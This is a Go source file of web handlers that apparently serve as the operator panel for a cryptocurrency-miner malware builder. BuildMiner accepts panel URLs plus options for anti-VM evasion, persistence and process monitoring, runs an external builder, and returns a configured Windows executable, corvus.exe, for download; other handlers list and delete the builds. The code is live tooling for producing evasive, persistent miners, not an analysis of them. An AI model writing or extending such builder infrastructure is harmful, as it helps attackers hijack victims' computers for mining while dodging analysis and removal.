package handlers

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

type BuildRequest struct {
	PanelURLs         string `json:"panel_urls"`
	ProcessMonitoring bool   `json:"process_monitoring"`
	DebugConsole      bool   `json:"debug_console"`
	AntiVM            bool   `json:"anti_vm"`
	Persistence       bool   `json:"persistence"`
}

// BuildMiner handles the build request by calling the builder with arguments
func (h *Handler) BuildMiner(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var buildReq BuildRequest
	if err := json.NewDecoder(r.Body).Decode(&buildReq); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	if buildReq.PanelURLs == "" {
		http.Error(w, "Panel URL is required", http.StatusBadRequest)
		return
	}

	log.Printf("Build request received: %+v", buildReq)

	// Path to the builder executable (at top level)
	builderPath := "../builder"
	if _, err := os.Stat(builderPath); os.IsNotExist(err) {
		log.Printf("Builder not found at: %s", builderPath)
		http.Error(w, "Builder executable not found", http.StatusInternalServerError)
		return
	}

	// Create output directory in static/builds
	buildID := fmt.Sprintf("%d", time.Now().Unix())
	outputDir := filepath.Join("static", "builds")
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		log.Printf("Error creating output directory: %v", err)
		http.Error(w, "Error creating output directory", http.StatusInternalServerError)
		return
	}

	// Get absolute path for output directory
	absOutputDir, err := filepath.Abs(outputDir)
	if err != nil {
		log.Printf("Error getting absolute path: %v", err)
		http.Error(w, "Error resolving output path", http.StatusInternalServerError)
		return
	}

	// Prepare arguments for the builder
	args := []string{
		"-panel-urls", buildReq.PanelURLs,
		"-output", absOutputDir,
	}

	if buildReq.ProcessMonitoring {
		args = append(args, "-monitoring")
	}
	if buildReq.DebugConsole {
		args = append(args, "-debug")
	}
	if buildReq.AntiVM {
		args = append(args, "-antivm")
	}
	if buildReq.Persistence {
		args = append(args, "-persistence")
	}

	// Execute the builder
	cmd := exec.Command(builderPath, args...)
	cmd.Dir = "../Builder"

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Builder error: %v\nOutput: %s", err, output)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": fmt.Sprintf("Build failed: %v\nOutput: %s", err, output)})
		return
	}

	log.Printf("Builder output: %s", output)

	// Find the built binary in the static directory
	// Check both possible locations
	binaryPath := filepath.Join(outputDir, "corvus.exe")
	log.Printf("Looking for binary at: %s", binaryPath)

	// Also check absolute path
	absBinaryPath, _ := filepath.Abs(binaryPath)
	log.Printf("Absolute path: %s", absBinaryPath)

	if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
		log.Printf("Binary not found at: %s", binaryPath)
		// List directory contents for debugging
		if entries, err := os.ReadDir(outputDir); err == nil {
			log.Printf("Contents of %s:", outputDir)
			for _, entry := range entries {
				log.Printf("  - %s", entry.Name())
			}
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Build succeeded but binary not found in output directory"})
		return
	}

	// Send binary to client
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=corvus_%s.exe", buildID))
	w.Header().Set("Content-Type", "application/octet-stream")

	file, err := os.Open(binaryPath)
	if err != nil {
		log.Printf("Error opening binary: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Error reading binary"})
		return
	}
	defer file.Close()

	if _, err := io.Copy(w, file); err != nil {
		log.Printf("Error sending binary: %v", err)
		return
	}

	log.Printf("Build completed and binary sent successfully (ID: %s)", buildID)
}

type BuildFile struct {
	Name         string    `json:"name"`
	Size         int64     `json:"size"`
	ModifiedTime time.Time `json:"modified_time"`
}

// ListBuilds returns all built binaries in the static/builds directory
func (h *Handler) ListBuilds(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	buildsDir := filepath.Join("static", "builds")
	if err := os.MkdirAll(buildsDir, 0755); err != nil {
		log.Printf("Error creating builds directory: %v", err)
		http.Error(w, "Error accessing builds directory", http.StatusInternalServerError)
		return
	}

	files, err := os.ReadDir(buildsDir)
	if err != nil {
		log.Printf("Error reading builds directory: %v", err)
		http.Error(w, "Error reading builds directory", http.StatusInternalServerError)
		return
	}

	var builds []BuildFile
	for _, file := range files {
		if file.IsDir() {
			continue
		}

		info, err := file.Info()
		if err != nil {
			continue
		}

		builds = append(builds, BuildFile{
			Name:         file.Name(),
			Size:         info.Size(),
			ModifiedTime: info.ModTime(),
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(builds)
}

// DeleteBuild removes a specific build file
func (h *Handler) DeleteBuild(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Filename string `json:"filename"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	if req.Filename == "" {
		http.Error(w, "Filename is required", http.StatusBadRequest)
		return
	}

	// Prevent directory traversal
	if filepath.Base(req.Filename) != req.Filename {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}

	buildPath := filepath.Join("static", "builds", req.Filename)

	// Verify file exists
	if _, err := os.Stat(buildPath); os.IsNotExist(err) {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	// Delete the file
	if err := os.Remove(buildPath); err != nil {
		log.Printf("Error deleting file %s: %v", buildPath, err)
		http.Error(w, "Error deleting file", http.StatusInternalServerError)
		return
	}

	log.Printf("Deleted build file: %s", req.Filename)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "File deleted"})
}
